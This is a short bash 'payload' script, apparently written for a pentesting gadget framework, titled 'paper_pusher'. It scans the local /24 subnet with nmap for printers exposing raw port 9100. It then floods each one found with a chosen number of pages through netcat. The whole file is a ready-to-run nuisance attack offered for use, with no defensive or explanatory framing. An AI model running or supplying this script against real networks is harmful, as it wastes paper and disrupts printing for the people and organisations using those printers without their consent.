#!/bin/bash
# Title: paper_pusher
# Description: A payload to spam printers with print jobs
# Author: Jordan Lanham
# Date: 2025-12-23
# Version: 1.0

LOG "Starting paper-pusher..."
LOG "Gathering subnet IP address"

subnet=$(hostname -I | awk '{print $1}' | awk -F'.' '{print $1"."$2"."$3}')

LOG "Subnet identified as $subnet.0/24"
LOG "Scanning subnet for printers..."

IP=$(nmap $subnet.0/24 -p 9100 --open | awk '/Nmap scan report/ {print $NF}' | tr -d '()')
if [[ -n $IP ]]; then
	LOG "🖨 Printer found at: $IP, port 9100 exposed. 🖨\n"
	TEXT_PICKER "Enter the text to be printed\n(leave blank to dispense blank pages)" ""
	LOG "Text to be printed: $printtext\n"
	NUMBER_PICKER "How many pages would you like to dispense?" 1
	LOG "Number of pages selected: $pagecount"
		LOG "\nSending job to printer\n"
		for i in $(seq $pagecount)
		do
		echo -e "$printtext\n\f"
		done | nc -q 1 $IP 9100
 		LOG "Job sent successfully!"
 		LOG "Time to clean up the floor\n"
else
    LOG "No printers found on the subnet. Exiting."
fi
